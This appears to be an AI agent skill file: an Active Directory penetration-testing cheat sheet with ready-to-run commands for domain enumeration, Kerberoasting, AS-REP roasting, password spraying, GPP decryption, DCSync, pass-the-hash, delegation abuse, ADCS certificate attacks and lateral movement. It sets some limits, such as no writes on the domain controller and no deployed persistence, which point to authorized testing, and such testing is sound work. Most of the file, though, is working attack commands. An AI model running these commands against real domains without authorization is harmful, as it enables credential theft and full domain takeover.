---
name: active-directory-attack
description: Use when the target has a Windows domain environment, domain credentials have been obtained, or internal SMB/WinRM is reachable — domain enumeration, Kerberoast/AS-REP, delegation, ADCS, DCSync, BloodHound paths and the Exchange attack surface.
tags:
  cwe: [CWE-522, CWE-269, CWE-287]
  attack: [T1558.003, T1558.004, T1003.006, T1484, T1550.002]
  class: [active-directory, kerberos, domain, windows]
---

# Active Directory Cheat Sheet

## Prerequisites

- One domain account (even low privilege) or one already-controlled host; confirm the DC address and DNS (`nltest /dsgetdc:domain`).
- Write every hash/ticket to a fact **in full** (including source host, service, expiry).

## Enumeration (low noise first)

- No credentials: `nxc smb <dc>` (version/domain info), `nxc ldap <dc> -u '' -p ''` (anonymous);
- With credentials: `nxc smb <dc> -u user -p pass --users --groups --shares`;
- Domain info: `net user /domain`, `net group "Domain Admins" /domain`, `Get-ADUser -Filter *`;
- BloodHound: SharpHound collection (`-c All`) → analyse the shortest path to Domain Admins;
- Share enumeration: `nxc smb <host> -u user -p pass --shares`, focusing on GPP in SYSVOL/NETLOGON.

## Credential attacks

| Technique | Command | Notes |
|---|---|---|
| Kerberoast | `impacket-GetUserSPNs dom/user:pass -dc-ip dc -request` | Get a TGS for an SPN account → `hashcat -m 13100` |
| AS-REP | `impacket-GetNPUsers dom/ -usersfile users.txt -no-pass -format hashcat` | Accounts without pre-auth → `hashcat -m 18200` |
| Password spraying | `nxc smb <dc> -u users.txt -p 'Spring2026!' --continue-on-success` | Check the lockout policy first; keep it to 2-3 attempts |
| GPP | `gpp-decrypt <cpassword>` | Groups.xml in SYSVOL |
| DCSync | `impacket-secretsdump dom/admin:pass@dc` | Needs directory replication rights |
| PtH | `impacket-wmiexec -hashes :<ntlm> user@host` | Lateral movement without a plaintext password |

## Delegation

- Unconstrained delegation: `impacket-findDelegation dom/user:pass -dc-ip dc`;
- Constrained delegation → exploit S4U (`impacket-getST -spn cifs/host -impersonate administrator`);
- RBCD: write `msDS-AllowedToActOnBehalfOfOtherIdentity`, then go through S4U.

## ADCS (certificate services)

- `certipy find -u user@dom -p pass -dc-ip dc -vulnerable`;
- ESC1: the template lets the requester specify the SAN + client auth → request an administrator certificate;
- ESC8: HTTP relay → `certipy relay`;
- With the certificate: `certipy auth -pfx admin.pfx` to get a TGT.

## Exchange / Mail

- `/autodiscover/autodiscover.xml`, `/owa/`, `/ecp/`, `/mapi/` fingerprints;
- For ProxyLogon/ProxyShell-class bugs, do only the **version + behaviour** double verification; do not fire the exploit chain directly;
- Enumerate mailboxes through OWA/EWS auth differences (watch for lockouts).

## Lateral movement and persistence (demonstration level)

- WinRM: `nxc winrm <host> -u user -p pass -x whoami`;
- SMB exec: `impacket-psexec/smbexec`;
- For persistence, only record in a fact that it is feasible (scheduled task/service registration); **do not actually deploy it**.

## Evidence and boundaries

- Record every path as: starting host/account → technique → resulting privilege, forming a reviewable chain;
- **No write operations at all** on the domain controller; DCSync exports only the necessary account hashes (minimum set);
- Stop before triggering a lockout (a locked account tips them off); write a fact for decision-making.
